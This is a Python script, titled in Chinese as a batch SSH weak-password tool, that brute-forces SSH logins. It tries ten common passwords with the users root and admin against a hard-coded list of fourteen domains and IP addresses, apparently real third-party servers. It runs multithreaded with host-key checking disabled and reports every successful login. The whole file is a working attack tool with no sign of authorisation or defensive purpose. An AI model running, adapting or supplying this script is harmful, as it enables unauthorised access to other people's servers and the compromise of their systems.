#!/usr/bin/env python3
"""批量SSH弱口令"""
import subprocess, sys
from concurrent.futures import ThreadPoolExecutor

TARGETS = [
    ("huazirc.com","47.98.195.70"), ("emai.com","152.32.219.197"),
    ("china-pcba.com","123.58.214.9"), ("wancaomei.com","47.114.217.244"),
    ("jingjiasc.com","110.42.101.58"), ("ihanbridge.com","173.255.240.198"),
    ("smartermicro.com","47.101.179.177"), ("nnwilking.com","43.138.203.5"),
    ("etoptour.com","121.42.247.236"), ("shunnengoil.com","120.26.66.204"),
    ("wutaishanfojiao.com","47.93.192.193"), ("zgjsqw.com","103.148.58.62"),
    ("yiqig.com","47.94.112.177"), ("up135.com","47.115.80.123"),
]
PWDS = ["123456","admin","root","password","12345678","admin123","test","123123","123456789","888888"]

def try_ssh(t):
    name, ip = t
    for pw in PWDS:
        for user in ["root","admin"]:
            try:
                r = subprocess.run(
                    ["sshpass","-p",pw,"ssh","-o","StrictHostKeyChecking=no","-o","ConnectTimeout=4",
                     "-o","NumberOfPasswordPrompts=1",f"{user}@{ip}","echo OK"],
                    capture_output=True, timeout=8)
                if b"OK" in r.stdout:
                    print(f"!!! SSH HIT: {name}({ip}) {user}/{pw}", flush=True)
                    return f"{name} {user}/{pw}"
            except Exception:
                pass
    return None

with ThreadPoolExecutor(8) as ex:
    for r in ex.map(try_ssh, TARGETS):
        if r: print(r, flush=True)
print("SSH DONE")
